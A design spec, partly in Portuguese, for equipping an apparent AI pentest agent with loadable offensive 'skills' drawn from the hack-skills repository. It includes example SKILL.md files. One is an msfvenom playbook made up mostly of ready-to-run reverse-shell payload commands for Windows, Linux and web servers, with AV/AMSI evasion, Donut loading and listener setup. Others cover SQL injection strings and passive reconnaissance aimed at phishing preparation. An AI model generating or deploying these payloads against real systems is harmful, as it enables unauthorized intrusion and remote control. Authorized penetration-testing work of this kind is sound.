# Spec: Cybersecurity Skills

## Overview
Skills são instruções especializadas carregadas via `SKILL.md` files. Seguem o padrão [Agent Skills](https://agentskills.io/).

## Reference: yaklang/hack-skills

**127 skills** disponíveis em: https://github.com/yaklang/hack-skills/tree/main/skills

### Categorias Principais
| Categoria | Skills (exemplos) |
|-----------|-------------------|
| **Web App** | sqli-sql-injection, ssrf-server-side-request-forgery, xss-*, csrf-*,idor-*, prototype-pollution-* |
| **API** | api-auth-and-jwt-abuse, api-authorization-and-bola, api-recon-and-docs, graphql-* |
| **Auth** | authbypass-*, jwt-oauth-token-attacks, oauth-oidc-misconfiguration, saml-sso-assertion-attacks |
| **Network** | ntlm-relay-coercion, dns-rebinding-attacks, http-* |
| **Cloud/Container** | kubernetes-pentesting, container-escape-techniques |
| **Windows** | windows-privilege-escalation, windows-lateral-movement, windows-av-evasion, active-directory-* |
| **Linux** | linux-privilege-escalation, linux-lateral-movement, linux-security-bypass |
| **Mobile** | android-pentesting-tricks, ios-pentesting-tricks, mobile-ssl-pinning-bypass |
| **Crypto** | rsa-attack-techniques, hash-attack-techniques, lattice-crypto-attacks, symmetric-cipher-attacks |
| **Memory/Binary** | heap-exploitation, stack-overflow-and-rop, format-string-exploitation, kernel-exploitation |
| **AI/ML** | ai-ml-security, llm-prompt-injection |
| **Recon/Methodology** | recon-and-methodology, recon-for-sec |
| **Post-Exploitation** | tunneling-and-pivoting, reverse-shell-techniques |
| **WAF/Evasion** | waf-bypass-techniques, 401-403-bypass-techniques, csp-bypass-advanced |
| **File/Upload** | upload-insecure-files, file-access-vuln, path-traversal-lfi |
| **Business Logic** | business-logic-vuln, business-logic-vulnerabilities |
| **Specialized** | deserialization-insecure, ssti-server-side-template-injection, xslt-injection, clickjacking, open-redirect, csv-formula-injection, expression-language-injection, email-header-injection, crlf-injection, http-parameter-pollution, http2-specific-attacks, web-cache-deception, websocket-security, dangling-markup-injection, ghost-bits-cast-attack, arbitrary-write-to-rce, code-obfuscation-deobfuscation, sandbox-escape-techniques, vm-and-bytecode-reverse, subdomain-takeover, dependency-confusion, defi-attack-patterns, smart-contract-vulnerabilities, classical-cipher-analysis, steganography-techniques, symbolic-execution-tools, type-juggling, unauthorized-access-common-services, injection-checking, insecure-source-code-management, race-condition, request-smuggling, traffic-analysis-pcap, memory-forensics-volatility, macos-*, rsa-attack-techniques |

### Estrutura do Skill (exemplo sqli-sql-injection)
```markdown
---
name: sqli-sql-injection
description: SQL injection playbook. Use when input reaches SQL queries...
disable-model-invocation: false
---

# SKILL: SQL Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Advanced SQLi techniques...

## 0. RELATED ROUTING
- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when...

## 1. QUICK START
### Extended Scenarios
Also load [SCENARIOS.md](./SCENARIOS.md) when...

### Advanced Reference
Also load [SQLMAP_ADVANCED.md](./SQLMAP_ADVANCED.md) when...

### First-pass payload families
| Situation | Start With | Why |
|---|---|---|

### Small, stable first-pass set
```text
'
' or 1=1--
```

### DBMS routing hints
| Clue | Likely DBMS | Good Next Move |

## 1. DETECTION — SUBTLE INDICATORS
...

## 14. WAF BYPASS MATRIX
...
```

### Padrões de Arquivos Complementares
- `SCENARIOS.md` - Cenários estendidos/CVEs específicos
- `SQLMAP_ADVANCED.md` - Referência avançada de ferramentas
- Outros: `NUCLEI_TEMPLATES.md`, `TOOLS.md`, etc.

---

## Integração Proposta

### Opção 1: Fork + Adaptação (Recomendado)
```bash
# Clonar e adaptar
git clone https://github.com/yaklang/hack-skills.git ~/.sec-agent/skills/hack-skills

# Renomear skills para seguir nosso naming (opcional)
# sqli-sql-injection → vuln-web-sqli
# ssrf-server-side-request-forgery → vuln-web-ssrf
```

### Opção 2: Referência Direta (Symlink)
```bash
# No projeto
mkdir -p .pi/skills
ln -s ~/.sec-agent/skills/hack-skills/skills/* .pi/skills/

# Configurar no config.json
{
  "skillPaths": ["~/.sec-agent/skills/hack-skills/skills"]
}
```

### Opção 3: Curated Subset
Selecionar ~30-40 skills mais relevantes e copiar/adaptar para nossa estrutura:

```
skills/
├── vuln-web/
│   ├── sqli/ (from sqli-sql-injection)
│   ├── ssrf/ (from ssrf-server-side-request-forgery)
│   ├── xss/ (from xss-* skills)
│   ├── idor/ (from idor-broken-object-authorization)
│   ├── prototype-pollution/ (from prototype-pollution-*)
│   ├── ssti/ (from ssti-server-side-template-injection)
│   ├── deserialization/ (from deserialization-insecure)
│   ├── file-upload/ (from upload-insecure-files)
│   ├── path-traversal/ (from path-traversal-lfi)
│   └── waf-bypass/ (from waf-bypass-techniques, 401-403-bypass-techniques)
├── vuln-api/
│   ├── auth-jwt/ (from api-auth-and-jwt-abuse, jwt-oauth-token-attacks)
│   ├── authorization/ (from api-authorization-and-bola)
│   ├── graphql/ (from graphql-and-hidden-parameters)
│   └── oauth-oidc/ (from oauth-oidc-misconfiguration, saml-sso-assertion-attacks)
├── auth/
│   ├── bypass/ (from authbypass-authentication-flaws)
│   └── windows/ (from active-directory-*, ntlm-relay-coercion, kerberos-attacks)
├── post-exploit/
│   ├── windows/ (windows-privilege-escalation, windows-lateral-movement, windows-av-evasion)
│   ├── linux/ (linux-privilege-escalation, linux-lateral-movement)
│   ├── tunneling/ (tunneling-and-pivoting)
│   └── reverse-shell/ (reverse-shell-techniques)
├── cloud/
│   ├── kubernetes/ (kubernetes-pentesting)
│   └── container/ (container-escape-techniques)
├── mobile/
│   ├── android/ (android-pentesting-tricks)
│   └── ios/ (ios-pentesting-tricks)
├── crypto/
│   ├── rsa/ (rsa-attack-techniques)
│   ├── hash/ (hash-attack-techniques)
│   └── symmetric/ (symmetric-cipher-attacks)
├── binary/
│   ├── heap/ (heap-exploitation)
│   ├── stack/ (stack-overflow-and-rop)
│   ├── format-string/ (format-string-exploitation)
│   └── kernel/ (kernel-exploitation)
├── ai-ml/
│   ├── security/ (ai-ml-security)
│   └── prompt-injection/ (llm-prompt-injection)
├── recon/
│   ├── methodology/ (recon-and-methodology, recon-for-sec)
│   ├── subdomain/ (subdomain-takeover)
│   └── network/ (dns-rebinding-attacks, network-protocol-attacks)
└── tools/
    ├── sqlmap/ (referenced in SQLMAP_ADVANCED.md)
    ├── nuclei/ (referenced in skills)
    └── bloodhound/ (from active-directory-*)
```

---

## Skill Loading Strategy

### Auto-load (baseado no contexto)
```typescript
// No system prompt, skills relevantes são injetadas baseado em:
// - Keywords no user message ("sql injection", "sqli", "sqlmap")
// - Phase atual do pentest (recon, scan, exploit, post, report)
// - Target type (web, api, network, mobile, cloud)
```

### Explicit load (slash commands)
```bash
/skill:vuln-web-sqli
/skill:vuln-web-ssrf
/skill:post-exploit-windows-privesc
/skill:cloud-kubernetes
```

### Tool-assisted load
```bash
# read tool carrega skill file quando necessário
# Extension pode sugerir skills baseadas em findings
```

## Skill Structure
```
skills/
├── recon/
│   ├── passive/
│   │   ├── SKILL.md
│   │   ├── subdomain-enum.md
│   │   └── dns-enum.md
│   ├── active/
│   │   ├── SKILL.md
│   │   ├── port-scan.md
│   │   └── service-enum.md
│   └── cloud/
│       ├── SKILL.md
│       ├── aws-enum.md
│       └── azure-enum.md
├── vuln/
│   ├── web/
│   │   ├── SKILL.md
│   │   ├── owasp-top10.md
│   │   ├── api-testing.md
│   │   └── client-side.md
│   ├── network/
│   │   ├── SKILL.md
│   │   ├── smb-enum.md
│   │   └── ssl-tls.md
│   └── config/
│       ├── SKILL.md
│       ├── docker-security.md
│       └── k8s-security.md
├── exploit/
│   ├── web/
│   │   ├── SKILL.md
│   │   ├── sqli.md
│   │   ├── xss.md
│   │   └── rce.md
│   ├── network/
│   │   ├── SKILL.md
│   │   ├── smb-exploit.md
│   │   └── rdp-exploit.md
│   ├── payload/
│   │   ├── SKILL.md
│   │   ├── msfvenom.md
│   │   └── evasion.md
│   └── post/
│       ├── SKILL.md
│       ├── enum.md
│       ├── creds.md
│       ├── persist.md
│       └── pivot.md
├── pentest/
│   ├── methodology/
│   │   ├── SKILL.md
│   │   ├── ptes.md
│   │   ├── owasp.md
│   │   └── mitre-attack.md
│   ├── workflow/
│   │   ├── SKILL.md
│   │   ├── scope.md
│   │   ├── findings.md
│   │   └── evidence.md
│   └── reporting/
│       ├── SKILL.md
│       ├── executive.md
│       ├── technical.md
│       └── compliance.md
├── analysis/
│   ├── logs/
│   │   ├── SKILL.md
│   │   ├── syslog.md
│   │   ├── windows-event.md
│   │   └── web-access.md
│   ├── traffic/
│   │   ├── SKILL.md
│   │   ├── pcap-analysis.md
│   │   └── zeek.md
│   ├── malware/
│   │   ├── SKILL.md
│   │   ├── static.md
│   │   ├── dynamic.md
│   │   └── yara.md
│   ├── threat-intel/
│   │   ├── SKILL.md
│   │   ├── ioc-enrichment.md
│   │   └── attribution.md
│   └── forensics/
│       ├── SKILL.md
│       ├── memory.md
│       ├── disk.md
│       └── volatility.md
└── tools/
    ├── nmap/
    │   ├── SKILL.md
    │   ├── scripts.md
    │   └── output-parsing.md
    ├── burp/
    │   ├── SKILL.md
    │   ├── extensions.md
    │   └── macros.md
    ├── metasploit/
    │   ├── SKILL.md
    │   ├── modules.md
    │   └── resource-scripts.md
    └── bloodhound/
        ├── SKILL.md
        ├── queries.md
        └── analysis.md
```

---

## Core Skills (SKILL.md examples)

### `skills/recon/passive/SKILL.md`
```markdown
---
name: recon-passive
description: Passive reconnaissance techniques using OSINT sources without touching target infrastructure
disable-model-invocation: false
---

# Passive Reconnaissance Skill

## When to Use
- Initial target reconnaissance
- Attack surface mapping without alerting defenses
- Subdomain/domain enumeration
- Certificate transparency analysis

## Methodology

### 1. Subdomain Enumeration
**Tools:** subfinder, amass, assetfinder, findomain, crt.sh, certspotter
**Sources:**
- Certificate Transparency logs (crt.sh, certspotter, CT-FR)
- Search engines (Google, Bing, DuckDuckGo dorks)
- DNS datasets (Rapid7, SecurityTrails, VirusTotal)
- Passive DNS (Farsight, CIRCL)
- Code repositories (GitHub, GitLab, Bitbucket)

**Commands:**
```bash
# subfinder - comprehensive
subfinder -d target.com -all -recursive -o subdomains.txt

# amass - deep enumeration
amass enum -passive -d target.com -o amass.txt

# crt.sh via curl
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

### 2. DNS Reconnaissance
**Record Types:** A, AAAA, CNAME, MX, TXT, NS, SOA, CAA, SRV
**Tools:** dig, dnsrecon, dnsenum, massdns

**Commands:**
```bash
# Full DNS enumeration
dnsrecon -d target.com -t std,axfr,srv,brute -D /usr/share/wordlists/dns/subdomains-top1million-110000.txt

# Zone transfer attempt
dig axfr @ns1.target.com target.com

# Subdomain brute force with massdns
massdns -r /etc/resolv.conf -t A -o S -w results.txt subdomains.txt
```

### 3. SSL/TLS Certificate Analysis
**Sources:** crt.sh, Censys, Shodan, certificate transparency logs
**Extract:** Subdomains, issuance dates, issuers, SANs

### 4. Technology Fingerprinting
**Tools:** Wappalyzer, BuiltWith, WhatRuns, retire.js
**Passive:** HTTP headers, HTML comments, JS libraries, cookies

### 5. Email & Personnel Reconnaissance
**Tools:** Hunter.io, LinkedIn, Phonebook.cz, theHarvester
**Use:** Phishing campaign prep, social engineering

### 6. Historical Data
**Sources:** Wayback Machine, Common Crawl, AlienVault OTX
**Find:** Old endpoints, deprecated APIs, leaked parameters

## Output Format
Structure findings as:
```json
{
  "subdomains": ["api.target.com", "dev.target.com", ...],
  "dns_records": {"target.com": {"A": ["1.2.3.4"], "MX": ["mail.target.com"]}},
  "technologies": ["nginx", "React", "Node.js", "PostgreSQL"],
  "emails": ["admin@target.com", "dev@target.com"],
  "historical_urls": ["https://target.com/admin/old.php", ...],
  "certificates": [{"subject": "*.target.com", "issuer": "Let's Encrypt", "sans": [...]}]
}
```

## Safety
- Only passive techniques (no packets sent to target)
- Respect rate limits on public APIs
- No authentication attempts
```

### `skills/vuln/web/owasp-top10/SKILL.md`
```markdown
---
name: vuln-web-owasp-top10
description: OWASP Top 10 2021 web application vulnerability testing methodology
disable-model-invocation: false
---

# OWASP Top 10 2021 Testing Skill

## A01: Broken Access Control
**Test Cases:**
- Vertical privilege escalation (user → admin)
- Horizontal privilege escalation (user A → user B data)
- IDOR (Insecure Direct Object References)
- Path traversal (../, URL encoding, double encoding)
- Missing function-level access control
- CORS misconfiguration allowing credentialed requests
- Force browsing to authenticated pages
- Metadata manipulation (JWT, session tokens)

**Tools:** Autorize (Burp), IDOR scanner, custom scripts

## A02: Cryptographic Failures
**Test Cases:**
- TLS 1.0/1.1/1.2 with weak ciphers
- Certificate validation bypass
- Sensitive data in transit (HTTP, FTP, SMTP)
- Sensitive data at rest (unencrypted DB, config files)
- Weak hashing (MD5, SHA1, unsalted)
- Insecure key management (hardcoded keys, weak generation)
- Padding oracle attacks

**Tools:** testssl.sh, sslyze, CryptCheck

## A03: Injection
**Types:** SQLi, NoSQLi, Command Injection, LDAPi, XSS, XPath, Header Injection
**Test Cases:**
- Error-based, boolean-based, time-based, stacked queries
- WAF bypass techniques (encoding, fragmentation, HTTP parameter pollution)
- Second-order injection
- Blind injection exploitation
- Out-of-band (DNS, HTTP) exfiltration

**Tools:** sqlmap, NoSQLMap, Commix, XSStrike, DalFox

## A04: Insecure Design
**Test Cases:**
- Missing business logic validation
- Race conditions (TOCTOU)
- Insecure default configurations
- Missing rate limiting / throttling
- Weak password policies
- Insecure password reset flows
- Missing anti-automation (CAPTCHA, device fingerprinting)

## A05: Security Misconfiguration
**Test Cases:**
- Default credentials (admin/admin, admin/password)
- Debug endpoints enabled (/actuator, /debug, /swagger)
- Directory listing enabled
- Unnecessary features enabled (WebDAV, PUT/DELETE)
- Outdated software (server, framework, libraries)
- Security headers missing (CSP, HSTS, X-Frame-Options)
- Cloud storage misconfiguration (public S3, Azure Blob)
- Container/K8s misconfig (privileged pods, hostPath, default SA)

**Tools:** nuclei, kube-hunter, kube-bench, prowler

## A06: Vulnerable Components
**Test Cases:**
- CVE matching in dependencies (npm, pip, maven, nuget, cargo)
- Outdated frameworks (Spring, Django, .NET, Express)
- Unmaintained libraries
- Supply chain attacks (typosquatting, dependency confusion)
- Client-side vulnerable libraries (jQuery, Bootstrap, Lodash)

**Tools:** OWASP Dependency Check, Snyk, npm audit, pip-audit, retire.js

## A07: Authentication & Session Failures
**Test Cases:**
- Credential stuffing / password spraying
- Weak password policy
- Username enumeration (registration, login, reset)
- Session fixation / hijacking
- JWT vulnerabilities (none alg, weak secret, key confusion)
- Missing MFA / weak MFA (SMS, email)
- Password reset token predictability
- Remember me token security

## A08: Software & Data Integrity Failures
**Test Cases:**
- CI/CD pipeline security
- Unsigned dependencies / artifacts
- Auto-update without verification
- Insecure deserialization (Java, .NET, PHP, Python, Node)
- Software bill of materials (SBOM) validation

## A09: Logging & Monitoring Failures
**Test Cases:**
- Insufficient logging of security events
- Log injection / forging
- Alerting on critical events
- Log retention / integrity
- Correlation capability

## A10: SSRF
**Test Cases:**
- Basic SSRF (localhost, internal IPs, metadata services)
- Blind SSRF (out-of-band via DNS/HTTP)
- SSRF via PDF generators, image fetchers, webhooks
- Cloud metadata service access (AWS 169.254.169.254, Azure, GCP)
- Bypass techniques (DNS rebinding, IPv6, URL encoding, redirect chains)

## Testing Workflow
1. **Map Application** - Spider/crawl, identify all endpoints
2. **Auth Analysis** - Understand auth flows, session management
3. **Input Mapping** - Catalog all user inputs (params, headers, body, files)
4. **Automated Scan** - Run nuclei, dalfox, sqlmap with auth
5. **Manual Testing** - Focus on business logic, authz, complex flows
6. **Client-Side** - DOM XSS, postMessage, storage, CSP bypass
7. **API Testing** - GraphQL introspection, REST endpoints, rate limits
8. **Documentation** - Evidence, PoC, CVSS, remediation per finding
```

### `skills/exploit/payload/msfvenom/SKILL.md`
```markdown
---
name: exploit-payload-msfvenom
description: Metasploit msfvenom payload generation and encoding techniques
disable-model-invocation: false
---

# Msfvenom Payload Generation Skill

## Payload Types

### Staged vs Stageless
- **Staged:** Small initial stager downloads full payload (meterpreter)
  - `windows/x64/meterpreter/reverse_tcp` (staged)
  - Smaller size, requires Metasploit handler
- **Stageless:** Full payload self-contained
  - `windows/x64/meterpreter_reverse_tcp` (stageless, note underscore)
  - Larger, works with netcat/any listener

### Common Payloads

#### Windows
```bash
# Staged reverse TCP (most common)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe

# Stageless reverse TCP
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe

# PowerShell (staged)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f psh -o payload.ps1

# HTA (staged)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f hta-psh -o payload.hta

# Service executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe-service -o service.exe
```

#### Linux
```bash
# ELF reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o payload.elf

# Shell (no meterpreter)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf
```

#### Web Payloads
```bash
# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war -o shell.war

# ASP.NET
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f aspx -o shell.aspx
```

## Encoding & Evasion

### Encoders (legacy, limited effectiveness)
```bash
# List encoders
msfvenom --list encoders

# Apply encoder
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/xor -i 3 -f exe -o encoded.exe
```

### Modern Evasion (prefer these)
1. **Donut** - Shellcode injection (.NET, PE, VBScript, etc.)
   ```bash
   donut -f payload.exe -o payload.bin -a 2 -c Meterpreter -p "LHOST=10.0.0.1 LPORT=4444"
   ```

2. **Shellcode Fluctuation** - Polymorphic shellcode
3. **Custom Loaders** - Golang, Rust, Nim loaders with syscalls
4. **Amsi/Bypass** - AMSI bypass, ETW patching, DLL unhooking

### Format Options
| Format | Use Case |
|--------|----------|
| `exe` | Windows executable |
| `dll` | DLL for DLL hijacking, rundll32 |
| `psh` / `psh-cmd` | PowerShell script |
| `hta-psh` | HTML Application |
| `vba` / `vba-exe` | Office macro |
| `elf` / `macho` | Linux/macOS binary |
| `raw` | Raw shellcode (for custom loaders) |
| `c` / `cpp` / `csharp` | Source code integration |
| `jar` / `war` | Java webapps |
| `python` | Python script |
| `ruby` | Ruby script |

## Listener Setup

### Metasploit (msfconsole)
```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
set ExitOnSession false
exploit -j
```

### Netcat (stageless only)
```bash
nc -lvnp 4444
```

### Custom C2 (Sliver, Covenant, Mythic, Brute Ratel)
- Generate stageless payload
- Configure listener in C2 framework
- Use profile/malleable config for traffic shaping

## Safety
- Only generate payloads for authorized targets
- Test in isolated lab environment first
- Use `--dry-run` to preview commands
- Never commit payloads to version control
```

---

## Skill Loading

```bash
# Global skills
mkdir -p ~/.pi/skills
cp -r skills/* ~/.pi/skills/

# Project skills
mkdir -p .pi/skills
cp -r skills/* .pi/skills/

# Explicit load
pi --skill ./my-skills/
```

## Skill Invocation

- **Auto-invoked:** When task matches skill description (in system prompt)
- **Explicit:** `/skill:recon-passive` or `/skill:vuln-web-owasp-top10`
- **Read tool:** `read` tool loads skill file content for reference